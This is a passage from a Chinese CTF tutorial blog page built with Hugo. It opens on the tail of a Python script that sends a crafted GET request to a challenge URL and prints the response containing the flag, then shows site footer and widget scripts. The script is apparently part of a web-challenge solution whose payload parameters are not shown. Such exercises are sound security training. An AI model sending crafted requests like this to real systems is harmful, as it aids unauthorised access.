+</span></span><span class="line"><span class="cl">    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">target_url</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">params</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 输出结果</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;请求URL（可直接复制到浏览器）：</span><span class="se">\n</span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">url</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">响应状态码：&#34;</span><span class="p">,</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">响应内容（含flag）：&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;请求失败：&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+        <link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css"integrity="sha384-n8MVd4RsNIU0tAv4ct0nTaAbDJwPJzDEaqSD1odI&#43;WdtXRGWt2kTvGFasHpSy3SV"crossorigin="anonymous"
+            ><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js"integrity="sha384-XjKyOOlGwcjNTAIQHIpgOno0Hl1YQqzUOEleOLALmuqehneUG&#43;vnGctmUb0ZY0l8"crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js"integrity="sha384-&#43;VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4&#43;/RRE05"crossorigin="anonymous"
+                defer
+                >
+            </script><script>
+    window.addEventListener("DOMContentLoaded", () => {
+	const mainArticleElement = document.querySelector(".main-article");
+        renderMathInElement(mainArticleElement, {
+            delimiters: [
+                { left: "$$", right: "$$", display: true },
+                { left: "$", right: "$", display: false },
+                { left: "\\(", right: "\\)", display: false },
+                { left: "\\[", right: "\\]", display: true }
+            ],
+            ignoredClasses: ["gist"]
+        });})
+</script>
+<div class="math-katex"></div>
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/5.-web-%E5%85%A5%E9%97%A8/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">5. Web 入门</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/4.-crypto%E5%85%A5%E9%97%A8/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">4. Crypto入门</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/3.-misc-%E5%85%A5%E9%97%A8/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">3. Misc 入门</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/2.-%E9%83%A8%E5%88%86%E8%BD%AF%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2. 部分软件的使用</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/1.-ctf%E7%AE%80%E4%BB%8B%E5%92%8C%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E5%A4%B4%E5%B0%BE/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">1. CTF简介和常见文件头尾</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+        <div class="comment-container mt-8"></div>
+        
+        
+    <script src="https://utteranc.es/client.js" 
+        repo="makabaka11/makabaka11.github.io"
+        issue-term="pathname"
+        
+        crossorigin="anonymous"
+        async
+        >
+</script>
+
+<style>
+    .utterances {
+        max-width: unset;
+    }
+</style>
+
+<script>
+    let utterancesLoaded = false;
+
+    function setUtterancesTheme(theme) {
+        let utterances = document.querySelector('.utterances iframe');
+        if (utterances) {
+            utterances.contentWindow.postMessage(
+                {
+                    type: 'set-theme',
+                    theme: `github-${theme}`
+                },
+                'https://utteranc.es'
+            );
+        }
+    }
+
+    addEventListener('message', event => {
+        if (event.origin !== 'https://utteranc.es') return;
+
+        
+        utterancesLoaded = true;
+        setUtterancesTheme(document.documentElement.dataset.scheme)
+    });
+
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (!utterancesLoaded) return;
+        setUtterancesTheme(e.detail)
+    })
+</script>
+
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2025 - 
+        
+        2026 Retr0
+    </section>
+    
+    <section class="running-time">
+    已存在于互联网
+    <span id="runningdays" class="running-days"></span>
+    </section>
+    
+    <section class="totalcount">
+        
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+        发表了125篇文章 · 
+        总计209.64k字
+    </section>
+
+
+    <section class="powerby">
+        
+            Powered by ctOS <br/>
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.31.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+
+                <script src="/js/APlayer.min.js"></script>
+                <script src="/js/Meting.min.js"></script>
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.eaf1211e4c7db355f37ceea53df13700e1b77fbcc3cfe8c1c1f69e4468a752e1.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+<link rel="stylesheet" href="/css/custom.css">
+
+<script>
+(function () {
+    const url = new URL(window.location.href);
+
+    
+    if (url.searchParams.has('utterances')) {
+
+        
+        
+        window.location.replace(window.location.pathname);
+    }
+})();
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script>
+
+<script>
+    var pjax = new Pjax({
+        selectors: [".main-container"]
+    });
+</script>
+
+
+<script src=https://www.retr0.xyz/js/topbar.min.js></script>
+
+
+
+<script>
+function initUtterances() {
+    const isArticle = document.querySelector('.article-page') && document.querySelector('.article-content');
+    if (!isArticle) return;
+
+    const oldScript = document.querySelector('script[src^="https://utteranc.es/client.js"]');
+    if (oldScript) oldScript.remove();
+
+    const container = document.querySelector('.comment-container');
+    if (!container) return;
+
+    container.innerHTML = '';
+
+    let script = document.createElement('script');
+    script.src = 'https://utteranc.es/client.js';
+    script.setAttribute('repo', 'makabaka11/makabaka11.github.io');
+    script.setAttribute('issue-term', 'pathname');
+    script.setAttribute('crossorigin', 'anonymous');
+    script.async = true;
+    container.appendChild(script);
+}
+</script>
+
+<script>
+document.addEventListener("DOMContentLoaded", () => {
+    if (!window.pjax || !window.pjax.state) initUtterances();
+});
+</script>
+
+
+<script>
+pjax._handleResponse = pjax.handleResponse;
+pjax.handleResponse = function(responseText, request, href, options) {
+    if (request.responseText.match("<html")) {
+        if (responseText) {
+            let newDom = new DOMParser().parseFromString(responseText, 'text/html');
+            document.body.setAttribute("class", newDom.body.className);
+        }
+        pjax._handleResponse(responseText, request, href, options);
+    }
+};
+</script>
+
+
+<script>
+topbar.config({
+    barColors: {
+        '0': 'rgba(255, 255, 255, 1)',
+        '1.0': 'rgba(255, 183, 197, 1)'
+    }
+});
+
+document.addEventListener('pjax:send', () => topbar.show());
+
+document.addEventListener('pjax:complete', () => {
+    window.Stack.init();
+    topbar.hide();
+    setTimeout(initUtterances, 0);
+    updateViewCount();
+    renderKaTeX();
+    initPhotoSwipeFromDOM('.article-content');   
+    initLive2D();                                
+});
+</script>
+
+
+<script>
+function updateViewCount() {
+    const viewCountEl = document.getElementById('vercount_value_page_pv');
+    if (!viewCountEl) return;
+
+    viewCountEl.textContent = 'loading...';
+    const url = 'https://cn.vercount.one/js';
+
+    const old = document.querySelector(`script[src="${url}"]`);
+    if (old) old.remove();
+
+    const s = document.createElement('script');
+    s.src = url;
+    s.defer = true;
+    document.head.appendChild(s);
+
+    showHideView();
+}
+
+function showHideView() {
+    const viewCounts = document.querySelectorAll("#viewCount");
+    const isArticle = document.querySelector(".article-page");
+    viewCounts.forEach(ele => ele.style.display = isArticle ? 'block' : 'none');
+}
+</script>
+
+<script>
+    function showHideView() {
+        
+        let viewCounts = document.querySelectorAll("#viewCount");
+        if (viewCounts) {
+            
+            let article =  document.querySelector(".article-page");
+            if (!article) {
+                viewCounts.forEach(ele => {
+                    ele.style.display = 'none';
+                });
+            }
+        }
+    }
+    
+    showHideView();
+</script>
+
+
+
+<script>
+async function renderKaTeX() {
+    let katex = document.querySelector(".math-katex");
+    if (!katex) return;
+
+    while (typeof renderMathInElement !== 'function') {
+        await new Promise(r => setTimeout(r, 500));
+    }
+
+    const content = document.querySelector('.article-content') || document.body;
+    renderMathInElement(content, {
+        delimiters: [
+            { left: "$$", right: "$$", display: true },
+            { left: "$", right: "$", display: false },
+            { left: "\\(", right: "\\)", display: false },
+            { left: "\\[", right: "\\]", display: true }
+        ],
+        ignoredClasses: ["gist"]
+    });
+}
+</script>
+
+
+<div id="particles-js"></div>
+
+<script src=https://www.retr0.xyz/background/particles.min.js></script>
+<script>
+particlesJS.load('particles-js',
+    "https://www.retr0.xyz/background/particlesjs-config.json",
+    () => console.log('particles.js loaded')
+);
+</script>
+
+<style>
+#particles-js {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%;
+    z-index: -1;
+}
+</style>
+
+<script>
+
+function initPhotoSwipeFromDOM(selector) {
+    if (!window.PhotoSwipe) return;
+
+    const containers = document.querySelectorAll(selector);
+    if (!containers.length) return;
+
+    containers.forEach(container => {
+        const images = container.querySelectorAll('img');
+
+        images.forEach((img, index) => {
+
+            
+            function getImageSize() {
+                return new Promise(resolve => {
+                    if (img.complete && img.naturalWidth) {
+                        resolve({
+                            w: img.naturalWidth,
+                            h: img.naturalHeight
+                        });
+                    } else {
+                        const tmp = new Image();
+                        tmp.src = img.src || img.getAttribute("data-src");
+                        tmp.onload = () => resolve({ w: tmp.width, h: tmp.height });
+                    }
+                });
+            }
+
+            img.style.cursor = "zoom-in";
+
+            
+            img.addEventListener("click", async (e) => {
+                e.preventDefault();
+
+                const size = await getImageSize();
+                const pswpEl = document.querySelector('.pswp');
+
+                const items = Array.from(images).map(i => ({
+                    src: i.src || i.getAttribute("data-src"),
+                    msrc: i.src,
+                    w: i.naturalWidth || 800,
+                    h: i.naturalHeight || 600,
+                }));
+
+                items[index].w = size.w;
+                items[index].h = size.h;
+
+                const gallery = new PhotoSwipe(pswpEl, PhotoSwipeUI_Default, items, {
+                    index,
+                    history: false
+                });
+                
+                enablePhotoSwipeWebShare(gallery);
+
+                gallery.init();
+            });
+        });
+    });
+}
+
+
+
+
+
+function enablePhotoSwipeWebShare(gallery) {
+    gallery.listen('shareLinkClick', function(shareButtonData, e) {
+        e.preventDefault();
+
+        const item = gallery.currItem;
+
+        if (navigator.share) {
+            navigator.share({
+                title: document.title,
+                text: '给你分享一张图片：',
+                url: item.src
+            }).catch(err => console.log("分享失败：", err));
+
+            return false; 
+        }
+
+        
+        return true;
+    });
+}
+</script>
+
+
+
+<script>
+
+
+window._live2d_loaded = window._live2d_loaded || false;
+window._live2d_initialized = window._live2d_initialized || false;
+
+
+function loadLive2DAssetsOnce(cdnPath) {
+    if (window._live2d_loaded) return Promise.resolve();
+
+    window._live2d_loaded = true;
+
+    return Promise.all([
+        loadRes(cdnPath + "waifu.css", "css"),
+        loadRes(cdnPath + "Core/live2dcubismcore.js", "js"),
+        loadRes(cdnPath + "live2d-sdk.js", "js"),
+        loadRes(cdnPath + "waifu-tips.js", "js")
+    ]);
+}
+
+
+function initLive2DWidgetOnce(cdnPath) {
+
+    if (window._live2d_initialized) return;
+
+    
+    const old = document.querySelector("#waifu");
+    if (old) old.remove();
+
+    window._live2d_initialized = true;
+
+    initWidget({
+        waifuPath: cdnPath + "waifu-tips.json",
+        cdnPath: cdnPath + "Resources/",
+        tools: ["hitokoto", "asteroids", "express", "switch-model", "switch-texture", "photo", "info", "quit"],
+        dragEnable: true,
+        dragDirection: ["x", "y"],
+        switchType: "order"
+    });
+
+    console.log("[Live2D] Widget initialized.");
+}
+
+
+function loadRes(url, type) {
+    return new Promise((resolve) => {
+        let tag;
+        if (type === "css") {
+            tag = document.createElement("link");
+            tag.rel = "stylesheet";
+            tag.href = url;
+        } else {
+            tag = document.createElement("script");
+            tag.src = url;
+        }
+        tag.onload = resolve;
+        document.head.appendChild(tag);
+    });
+}
+
+
+function initLive2D() {
+    if (screen.width < 768) return;
+
+    const cdnPath = "https://www.retr0.xyz/blog-live2d/";
+
+    loadLive2DAssetsOnce(cdnPath)
+        .then(() => initLive2DWidgetOnce(cdnPath));
+}
+
+initLive2D();  
+
+
+document.addEventListener("pjax:complete", () => {
+    initLive2D(); 
+});
+</script>
+
+
+<style>
+    .highlight {
+         
+        max-height: 400px;
+        overflow: hidden;
+        position: relative;  
+    }
+
+    .code-show {
+        max-height: none !important;
+    }
+
+    .code-more-box {
+        width: 100%;
+        padding-top: 78px;
+        background-image: -webkit-gradient(linear, left top, left bottom, from(rgba(255, 255, 255, 0)), to(#fff));
+        position: absolute;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        z-index: 1;
+    }
+
+    .code-more-btn {
+        display: block;
+        margin: auto;
+        width: 44px;
+        height: 22px;
+        background: #f0f0f5;
+        border-top-left-radius: 8px;
+        border-top-right-radius: 8px;
+        padding-top: 6px;
+        cursor: pointer;
+    }
+
+    .code-more-img {
+        cursor: pointer !important;
+        display: block;
+        margin: auto;
+        width: 22px;
+        height: 16px;
+    }
+</style>
+
+<script>
+  function initCodeMoreBox() {
+    let codeBlocks = document.querySelectorAll(".highlight");
+    if (!codeBlocks) {
+      return;
+    }
+    codeBlocks.forEach(codeBlock => {
+      
+      const existingBox = codeBlock.querySelector('.code-more-box');
+      if (existingBox) existingBox.remove();
+
+      
+      if (codeBlock.scrollHeight <= codeBlock.clientHeight) {
+        return;
+      }
+      
+      
+      let codeMoreBox = document.createElement('div');
+      codeMoreBox.classList.add('code-more-box');
+      
+      let codeMoreBtn = document.createElement('span');
+      codeMoreBtn.classList.add('code-more-btn');
+      codeMoreBtn.addEventListener('click', () => {
+        codeBlock.classList.add('code-show');
+        codeMoreBox.style.display = 'none';
+        
+        window.dispatchEvent(new Event('resize'))
+      })
+      
+      let img = document.createElement('img');
+      img.classList.add('code-more-img');
+      img.src = "https://www.retr0.xyz/icons/codeMore.png"
+      
+      codeMoreBtn.appendChild(img);
+      codeMoreBox.appendChild(codeMoreBtn);
+      codeBlock.appendChild(codeMoreBox)
+    })
+  }
+  
+  initCodeMoreBox();
+  
+  
+  document.addEventListener('pjax:complete', () => {
+    initCodeMoreBox();
+  });
+</script>
+
+
+<script>
+
+
+window.__articlePlayers = window.__articlePlayers || [];
+
+
+
+function getGlobalMetingPlayer() {
+    return window.__globalMetingPlayer || null;
+}
+
+
+
+function pauseGlobalMeting() {
+    const p = getGlobalMetingPlayer();
+    if (p && !p.audio.paused) {
+        p.pause();
+        console.log('[APlayer] Pause global Meting');
+    }
+}
+
+
+
+function pauseArticlePlayers() {
+    window.__articlePlayers.forEach(p => {
+        if (p && !p.audio.paused) {
+            p.pause();
+        }
+    });
+}
+
+
+
+function initAPlayers() {
+    if (typeof APlayer === "undefined") return;
+
+    document.querySelectorAll('.aplayer-article').forEach(el => {
+        if (el.dataset.loaded === "true") return;
+        el.dataset.loaded = "true";
+
+        const ap = new APlayer({
+            container: el,
+            fixed: false,
+            autoplay: false,
+            loop: 'none',
+            order: 'list',
+            preload: 'metadata',
+            volume: 0.7,
+            mutex: false, 
+            audio: [{
+                name: el.dataset.title || 'Unknown',
+                artist: el.dataset.artist || '',
+                url: el.dataset.src,
+                cover: el.dataset.cover || '',
+                lrc: el.dataset.lrc || '',
+            }]
+        });
+
+        
+        ap.on('play', () => {
+            
+            pauseGlobalMeting();
+
+            
+            window.__articlePlayers.forEach(other => {
+                if (other !== ap && !other.audio.paused) {
+                    other.pause();
+                }
+            });
+
+    console.log('[APlayer] Switch article track');
+});
+
+
+        window.__articlePlayers.push(ap);
+    });
+}
+
+
+
+function bindMetingMutex() {
+    const p = getGlobalMetingPlayer();
+    if (!p || p.__mutexBound) return;
+
+    p.__mutexBound = true;
+
+    
+    p.on('play', () => {
+        pauseArticlePlayers();
+    });
+
+    console.log('[Meting] Mutex bound');
+}
+
+
+
+function initAllPlayers() {
+    initAPlayers();
+    bindMetingMutex();
+}
+
+
+
+document.addEventListener("DOMContentLoaded", initAllPlayers);
+document.addEventListener("pjax:complete", initAllPlayers);
+</script>
+
+<script>
+
+
+function destroyArticlePlayers() {
+    if (!window.__articlePlayers || window.__articlePlayers.length === 0) return;
+
+    window.__articlePlayers.forEach(ap => {
+        try {
+            if (!ap.audio.paused) {
+                ap.pause();
+            }
+            ap.destroy(); 
+        } catch (e) {
+            console.warn('[APlayer] destroy failed', e);
+        }
+    });
+
+    window.__articlePlayers = [];
+    console.log('[APlayer] Article players destroyed');
+}
+
+
+
+document.addEventListener('pjax:send', () => {
+    destroyArticlePlayers();
+});
+</script>
+
+
+<script>
+let runningTimeTimer = null;
+
+function updateRunningTime() {
+    const el = document.getElementById('runningdays');
+    if (!el) return;
+
+    let start = '2025-10-26 00:00:00'; 
+    start = new Date(start.replace(/-/g, "/"));
+    const now = new Date();
+
+    const diff = Math.floor((now.getTime() - start.getTime()) / 1000);
+
+    const days = Math.floor(diff / (24 * 3600));
+    const hours = Math.floor((diff % (24 * 3600)) / 3600);
+    const minutes = Math.floor((diff % 3600) / 60);
+    const seconds = diff % 60;
+
+    el.textContent =
+        `${days}天${hours}小时${minutes}分钟${seconds}秒`;
+}
+
+function initRunningTime() {
+    
+    updateRunningTime();
+
+    
+    if (runningTimeTimer) {
+        clearInterval(runningTimeTimer);
+    }
+
+    runningTimeTimer = setInterval(updateRunningTime, 1000);
+}
+
+ 
+document.addEventListener('DOMContentLoaded', () => {
+    initRunningTime();
+});
+
+ 
+document.addEventListener('pjax:complete', () => {
+    initRunningTime();
+});
+</script>
+
+
+
+
+<script>
+  
+  let originalTitle = document.title; 
+  const leaveTip = "桥豆麻袋(#°Д°)";     
+  const backTip = "(*'▽`*)欢迎回来!";        
+  const recoverDelay = 2000;           
+  let visibilityChangeHandler = null;  
+  let titleRecoverTimer = null;        
+
+  
+  function initTitleSwitch() {
+    
+    if (visibilityChangeHandler) {
+      document.removeEventListener('visibilitychange', visibilityChangeHandler);
+    }
+
+    
+    originalTitle = document.title;
+
+    
+    visibilityChangeHandler = function() {
+      
+      clearTimeout(titleRecoverTimer);
+
+      if (document.hidden) {
+        
+        document.title = leaveTip;
+      } else {
+        
+        document.title = backTip;
+        
+        titleRecoverTimer = setTimeout(() => {
+          document.title = originalTitle;
+        }, recoverDelay);
+      }
+    };
+
+    
+    document.addEventListener('visibilitychange', visibilityChangeHandler);
+  }
+
+  
+  document.addEventListener('pjax:success', function() {
+    
+    initTitleSwitch();
+  });
+
+  
+  window.onload = function() {
+    initTitleSwitch();
+  };
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+        
+
+
+<meting-js
+  id="14477349320"
+  server="netease"
+  type="playlist"
+  fixed="true"
+  bottom="20px"
+  right="20px"
+  autoplay="false"
+  width="300px"
+  preload="metadata"
+  mutex="false">
+</meting-js>
+
+<script>
+(function () {
+
+  
+  if (window.__global_meting_initialized) return;
+  window.__global_meting_initialized = true;
+
+  const STORAGE_KEY = "playInfo";
+  const PLAYLIST_ID = "14477349320";
+
+  function initGlobalMeting() {
+    const meting = document.querySelector('meting-js');
+    if (!meting) return;
+
+    
+    meting.addEventListener('aplayer-loaded', () => {
+      const ap = meting.aplayer;
+      if (!ap) return;
+
+      
+      window.__globalMetingPlayer = ap;
+      console.log('[Meting] Global APlayer ready');
+
+      bindPlayerEvents(ap);
+      restorePlayState(ap);
+    }, { once: true });
+  }
+
+  function bindPlayerEvents(ap) {
+    
+    const save = () => savePlayState(ap);
+
+    window.addEventListener('beforeunload', save);
+    document.addEventListener('visibilitychange', save);
+
+    
+    ap.on('play', () => {
+      document.dispatchEvent(new CustomEvent('global-player-play'));
+    });
+  }
+
+  function savePlayState(ap) {
+    if (!ap || !ap.list || !ap.audio) return;
+
+    const data = {
+      playlistId: PLAYLIST_ID,
+      index: ap.list.index,
+      currentTime: ap.audio.currentTime,
+      paused: ap.paused
+    };
+
+    localStorage.setItem(STORAGE_KEY, JSON.stringify(data));
+  }
+
+  function restorePlayState(ap) {
+    const data = JSON.parse(localStorage.getItem(STORAGE_KEY));
+    if (!data || data.playlistId !== PLAYLIST_ID) return;
+
+    if (data.index < ap.list.songs.length) {
+      ap.list.switch(data.index);
+      ap.once('canplay', () => {
+        ap.seek(data.currentTime || 0);
+        if (!data.paused) {
+          ap.play().catch(() => {
+            ap.notice("点击继续播放", 3000);
+          });
+        }
+      });
+    }
+  }
+
+  
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', initGlobalMeting);
+  } else {
+    initGlobalMeting();
+  }
+
+})();
+</script>
+
+    </body>
+</html>
